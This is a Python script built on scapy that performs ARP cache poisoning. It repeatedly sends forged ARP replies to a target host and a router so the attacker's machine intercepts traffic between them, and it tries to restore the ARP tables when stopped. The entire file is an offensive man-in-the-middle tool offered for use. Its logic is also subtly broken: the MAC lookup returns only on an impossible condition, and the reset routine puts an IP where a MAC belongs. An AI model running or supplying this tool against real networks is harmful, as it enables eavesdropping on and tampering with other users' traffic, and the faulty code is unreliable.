import scapy.all as scapy
import time
import optparse
def user_input():
	pobj = optparse.OptionParser()
	pobj.add_option("-t","--targetip",dest="ip1",help="Your target ip")
	pobj.add_option("-r","--rooterip",dest="ip2",help="Your rooter ip")
	options = pobj.parse_args()[0]
	if not options.ip1:
		print("Enter Target Ip")
	if not options.ip2:
		print("Enter Rooter Ip")
	return options
def arp_poisoning(ip1,ip2):

	target_mac = get_mac(ip1)

	arp_response = scapy.ARP(op=2,pdst=ip1,hwdst=target_mac,psrc=ip2)
	scapy.send(arp_response,verbose=False)
def reset_operation(ip1,ip2):

	target_mac = get_mac(ip1)
	getaway_mac = get_mac(ip2)
	arp_response = scapy.ARP(op=2,pdst=ip1,hwdst=target_mac,psrc=ip2,hwsrc=ip2)
	scapy.send(arp_response,verbose=False)

def get_mac(ip):
	arp_request_packet  = scapy.ARP(pdst=ip)
	brodcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	combined_packet = brodcast_packet/arp_request_packet
	answered_list=scapy.srp(combined_packet,timeout=1,verbose=False)[0]
	if answered_list == "":
		return answered_list[0][1].hwsrc
number = 0
user_ips = user_input()
user_ip1= user_ips.ip1
user_ip2= user_ips.ip2
try:
	while True:
		arp_poisoning(user_ips.ip1,user_ips.ip2)
		arp_poisoning(user_ips.ip2,user_ips.ip1)
		number += 2
		print("\rSending packets" +str(number),end="")
		time.sleep(3)
except KeyboardInterrupt:
	print("\nQuit and Reset")
	reset_operation(user_ips.ip1,user_ips.ip2)
	reset_operation(user_ips.ip2,user_ips.ip1)
